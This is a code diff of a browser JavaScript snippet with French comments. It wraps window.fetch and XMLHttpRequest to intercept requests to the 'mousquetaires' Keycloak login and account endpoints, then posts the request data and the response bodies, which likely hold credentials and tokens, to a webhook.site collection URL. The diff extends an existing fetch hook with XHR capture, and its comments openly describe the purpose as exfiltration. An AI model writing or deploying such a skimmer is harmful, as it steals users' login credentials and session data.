@@ -1,23 +1,62 @@
 (function() {
-  // Sauvegarde de la fonction fetch originale
+  // Endpoint de collecte (ton serveur)
+  const hookEndpoint = "https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8";
+
+  // ---------------------------
+  // Interception de fetch
+  // ---------------------------
   const originalFetch = window.fetch;
-  
-  // Redéfinition de fetch
   window.fetch = async function(input, init) {
-    // Récupération de l'URL (input peut être un objet Request)
-    const url = (typeof input === 'string') ? input : input.url;
+    let url = "";
+    if (typeof input === "string") {
+      url = input;
+    } else if (input && input.url) {
+      url = input.url;
+    }
     
-    // Vérifier si l'URL correspond à l'une de celles qui nous intéressent
-    if(url.includes('/auth/realms/mousquetaires/account') || url.includes('/auth/realms/mousquetaires/login-actions/authenticate')) {
-      // Par exemple, envoyer ces infos vers votre serveur de collecte
-      originalFetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8/collect', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ url, init })
+    // Vérifie si l'URL correspond à l'une des deux cibles
+    if (
+      url.includes("/auth/realms/mousquetaires/account") ||
+      url.includes("/auth/realms/mousquetaires/login-actions/authenticate")
+    ) {
+      // Exfiltrer les informations vers ton serveur
+      originalFetch(hookEndpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ url: url, init: init })
       });
     }
     
-    // Appel de la fonction fetch originale pour continuer le traitement normal
     return originalFetch(input, init);
+  };
+
+  // ---------------------------
+  // Interception de XMLHttpRequest (XHR)
+  // ---------------------------
+  // Redéfinition de open pour mémoriser l'URL
+  const originalOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function(method, url) {
+    this._url = url;
+    return originalOpen.apply(this, arguments);
+  };
+
+  // Redéfinition de send pour écouter la réponse
+  const originalSend = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send = function(body) {
+    this.addEventListener("load", function() {
+      if (
+        this._url && (
+          this._url.includes("/auth/realms/mousquetaires/account") ||
+          this._url.includes("/auth/realms/mousquetaires/login-actions/authenticate")
+        )
+      ) {
+        fetch(hookEndpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ url: this._url, response: this.responseText })
+        });
+      }
+    });
+    return originalSend.apply(this, arguments);
   };
 })();
